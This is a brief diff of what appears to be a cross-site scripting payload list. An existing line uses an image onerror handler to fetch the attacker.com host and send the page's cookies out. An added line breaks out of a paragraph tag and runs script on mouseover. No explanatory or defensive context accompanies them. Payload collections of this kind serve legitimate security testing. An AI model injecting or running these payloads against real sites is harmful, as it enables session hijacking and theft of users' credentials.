@@ -1,1 +1,3 @@
 <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
+
+</p><h1 onmouseover='confirm(5)'>xss</h1> 
